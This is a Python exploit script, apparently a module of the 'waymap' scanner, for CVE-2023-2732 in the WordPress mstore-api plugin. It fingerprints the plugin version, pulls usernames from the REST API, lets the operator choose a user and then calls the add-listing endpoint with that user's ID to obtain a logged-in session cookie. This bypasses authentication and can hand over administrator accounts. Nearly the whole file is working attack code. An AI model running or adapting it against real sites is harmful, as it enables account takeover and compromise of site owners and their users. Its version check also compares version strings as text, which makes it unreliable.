# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2023-2732

import click
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

def version_check(target):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    plugin_url = f"{target}/wp-content/plugins/mstore-api/readme.txt"
    
    print("[•] Checking plugin version from readme.txt...")
    
    try:
        response = requests.get(plugin_url, headers=headers, verify=False, timeout=30)
        
        if response.status_code == 200:
            content = response.text
            version_line = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
            
            if version_line:
                version = version_line.split(':')[1].strip()
                print(f"[•] Plugin version found: {version}")
                
                if version >= '3.9.3':
                    print("[•] The plugin version is 3.9.3 or above, which is not vulnerable.")
                    return False
                else:
                    print("[•] The plugin version is below 3.9.3 and might be vulnerable.")
                    return True
            else:
                print("[•] Could not retrieve version information from readme.txt.")
                return False
        else:
            print("[•] Failed to fetch readme.txt file, checking via wp-json API...")
            response = session.get(f"{target}/wp-json/", headers=headers, verify=False, timeout=30)
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print("[•] The plugin might be installed, but we couldn't verify the version. Proceeding with exploit...")
                return True
            else:
                print("[•] The plugin is not installed on this WordPress site.")
                return False
    except Exception as e:
        print(f"[•] Error checking plugin version: {e}")
        return False

def fetch_users_from_rest_api(target):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299'}
    print("[•] Fetching usernames via the REST API...")
    
    try:
        response = session.get(f"{target}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
        
        if response.status_code == 200:
            users = response.json()
            print("[•] Successfully retrieved user information.")
            return users
        else:
            print(f"[•] Failed to fetch usernames. Response: {response.text}")
            return []
    except Exception as e:
        print(f"[•] Error fetching usernames: {e}")
        return []

def prompt_user_selection(users):
    print("[•] Please select a user from the list below:")
    
    for user in users:
        print(f"  {user['id']}. {user['name']}")

    user_id = click.prompt("[•] Enter the user ID to select", type=int)
    selected_user = next((user for user in users if user['id'] == user_id), None)
    
    if selected_user:
        print(f"[•] User '{selected_user['name']}' selected.")
        return selected_user
    else:
        print("[•] Invalid user ID selected.")
        return None

def attempt_login_as_user(target, user_id, username):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    exploit_url = f"{target}/wp-json/wp/v2/add-listing?id={user_id}"

    print(f"[•] Attempting to authenticate as user '{username}' using the exploit...")
    
    try:
        response = session.get(exploit_url, headers=headers, verify=False, timeout=30)
        cookies = requests.utils.dict_from_cookiejar(response.cookies)
        
        if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
            print("\n[•] Vulnerable system found!")
            print("[•] Exploit Steps:")
            print(f"    1. Visit the following URL to trigger the exploit: {exploit_url}")
            print(f"    2. Visit {target} to be logged in as '{username}'.")
        elif response.status_code == 403 and "cf-cookie-error" in response.text:
            print("[•] Cloudflare is blocking the exploit attempt.")
        else:
            print(f"[•] Exploit attempt unsuccessful. Status Code: {response.status_code}")
            for header, value in response.headers.items():
                print(f"    {header}: {value}")
    except Exception as e:
        print(f"[•] Error during exploit attempt: {e}")